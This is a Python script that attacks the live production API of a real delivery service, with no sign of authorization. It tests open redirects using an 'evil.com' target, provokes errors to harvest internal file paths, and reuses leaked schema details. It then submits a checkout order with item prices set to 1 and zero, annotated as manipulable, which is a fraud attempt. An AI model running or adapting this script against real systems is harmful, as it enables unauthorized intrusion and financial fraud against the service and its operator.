"""Verify open redirect & probe front API."""
import requests

h = {'User-Agent': 'Mozilla/5.0', 'Origin': 'https://wolt.com'}
EVIL = 'https://evil.com'

# ===== 1. TRACE OPEN REDIRECT CHAINS =====
print("=== 1. OPEN REDIRECT TRACE ===")
targets = [
    ('wolt.com/logout', f'https://wolt.com/logout?next={EVIL}'),
    ('wolt.com/login', f'https://wolt.com/login?redirect={EVIL}'),
    ('wolt.com/redirect', f'https://wolt.com/redirect?url={EVIL}'),
]
for name, url in targets:
    try:
        r = requests.get(url, headers=h, allow_redirects=True, timeout=12)
        final_url = r.url
        chain = [h.url for h in r.history]
        chain_str = ' -> '.join([str(x.status_code) for x in r.history]) if r.history else 'no redirect'
        vuln = 'REAL OPEN REDIRECT!' if EVIL in final_url else ('external?' if not final_url.startswith('https://wolt.com') else 'safe (stays on wolt)')
        print(f'  {name}:')
        print(f'    chain: {chain_str}')
        print(f'    final: {final_url[:120]}')
        print(f'    verdict: {vuln}')
    except Exception as e:
        print(f'  {name}: ERR {e}')

# ===== 2. PROBE /v1/pages/front =====
print("\n=== 2. /v1/pages/front ===")
r = requests.get('https://consumer-api.wolt.com/v1/pages/front', headers=h)
d = r.json()
print(f'  Status: {r.status_code}')
print(f'  Keys: {list(d.keys())}')

# Check created timestamp
created = d.get('created', {})
if '$date' in created:
    import datetime
    ts = datetime.datetime.fromtimestamp(created['$date']/1000)
    print(f'  Created: {ts}')

# Check sections
sections = d.get('sections', [])
print(f'  Sections: {len(sections)}')
for i, s in enumerate(sections[:5]):
    print(f'    [{i}] template={s.get("template","?")} title={str(s.get("title",""))[:50]}')

# Check if there's any interesting data
page_name = d.get('name', '?')
expires = d.get('expires_in_seconds', '?')
print(f'  Name: {page_name}')
print(f'  Expires: {expires}s')

# Dump first section deeply
if sections:
    import json
    first = sections[0]
    print(f'\n  First section keys: {list(first.keys())}')
    # Look for venue data, banners, etc
    if 'venues' in str(first).lower() or 'banner' in str(first).lower():
        print(f'  FIRST SECTION: {json.dumps(first, indent=2)[:1000]}')

# ===== 3. PROBE /v1/cities (already confirmed 200) =====
print("\n=== 3. /v1/cities ===")
r = requests.get('https://consumer-api.wolt.com/v1/cities', headers=h)
cities = r.json()
results = cities.get('results', [])
print(f'  Status: {r.status_code}')
print(f'  Total cities: {len(results)}')
for c in results[:5]:
    print(f'    {c.get("name","?")} ({c.get("country_code_alpha2","?")}) — has_frontpage={c.get("has_frontpage","?")}')

# ===== 4. CHECK COUNTRY-SPECIFIC ENDPOINTS (from checkout enum leak) =====
print("\n=== 4. COUNTRY ENDPOINTS ===")
# The checkout error leaked all country codes: FIN, SWE, EST, DNK, LTU, LVA, NOR, GEO, HUN, CZE, POL, ISR, GRC, HRV, SRB, AZE, SVK, SVN, KAZ, CYP, JPN, MKD, MLT, DEU, LUX, AUT, ISL, ALB, UZB, XKX, ROU, IRL, BGR
# Try country-specific frontpages
for cc in ['FIN', 'SWE', 'DEU', 'JPN']:
    try:
        r = requests.get(f'https://consumer-api.wolt.com/v1/pages/front', 
                        headers={**h, 'Accept-Language': cc.lower()})
        if r.status_code == 200:
            d = r.json()
            print(f'  {cc}: {r.status_code} | sections={len(d.get("sections",[]))} | name={d.get("name","?")}')
    except Exception as e:
        print(f'  {cc}: ERR {e}')

# ===== 5. INTERNAL PATH DISCLOSURE IN ERRORS =====
print("\n=== 5. ERROR PATH DISCLOSURE ===")
# From earlier checkout: File \"/app/orderxp/pages/checkout/v2/api.py\", line 349
# Let's check other endpoints for similar disclosures
error_probes = [
    ('checkout', 'POST', 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', '{"test":1}'),
    ('search', 'POST', 'https://consumer-api.wolt.com/v1/pages/search', '{}'),
    ('gatekeeper', 'POST', 'https://gatekeeper.wolt.com/v1/corporate_admin', '{}'),
]
for label, method, url, body in error_probes:
    try:
        r = requests.request(method, url, headers={**h, 'Content-Type': 'application/json'}, data=body, timeout=10)
        txt = r.text
        if 'File ' in txt and '.py' in txt:
            import re
            paths = re.findall(r'File\s+"([^"]+\.py)"', txt)
            if paths:
                print(f'  {label}: PATH DISCLOSURE! {paths}')
        elif 'traceback' in txt.lower() or 'exception' in txt.lower():
            print(f'  {label}: ERROR | {txt[:150]}')
        else:
            print(f'  {label}: {r.status_code} | {txt[:100]}')
    except Exception as e:
        print(f'  {label}: ERR {e}')

# ===== 6. CHECK checkout price manipulation with full schema =====
print("\n=== 6. CHECKOUT SCHEMA DISCOVERY ===")
# The error messages tell us the required fields. Let's build the correct payload
# Required: purchase_plan.venue (country, currency), purchase_plan.menu_items[0] (base_price, end_amount, category_id, exclude_from_discounts, restrictions)
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
    headers={**h, 'Content-Type': 'application/json'},
    json={
        'basket_id': 'test-basket-001',
        'base_price': 100,
        'end_amount': 100,
        'pickup': False,
        'scheduled_time': None,
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'supplier_id': '60ebeb71c6904c2caf035f71',
        'selected_delivery_method': 'homedelivery',
        'vendor': 'wolt',
        'shipping_method': 'homedelivery',
        'currency': 'EUR',
        'discount': 0,
        'discount_code': None,
        'items': [{
            'id': 'bb7b9d9085663107b7824fa6',
            'name': 'Kinder Maxi',
            'count': 1,
            'price': 1,  # manipulable!
            'options': [],
            'base_price': 1,
            'end_amount': 0,  # try zero!
            'category_id': 'test',
            'exclude_from_discounts': False,
            'restrictions': {}
        }],
        'purchase_plan': {
            'venue': {
                'id': '60ebeb71c6904c2caf035f71',
                'country': 'FIN',
                'currency': 'EUR'
            },
            'delivery_method': 'homedelivery',
            'menu_items': [{
                'id': 'bb7b9d9085663107b7824fa6',
                'name': 'Kinder Maxi',
                'count': 1,
                'price': 1,
                'options': [],
                'base_price': 1,
                'end_amount': 0,
                'category_id': 'test',
                'exclude_from_discounts': False,
                'restrictions': {}
            }]
        }
    })
print(f'  Status: {r.status_code}')
if r.status_code == 200:
    d = r.json()
    pa = d.get('payable_amount', 'N/A')
    print(f'  payable_amount: {pa}')
    print(f'  Keys: {list(d.keys())[:10]}')
else:
    print(f'  Body: {r.text[:300]}')

print("\n=== DONE ===")
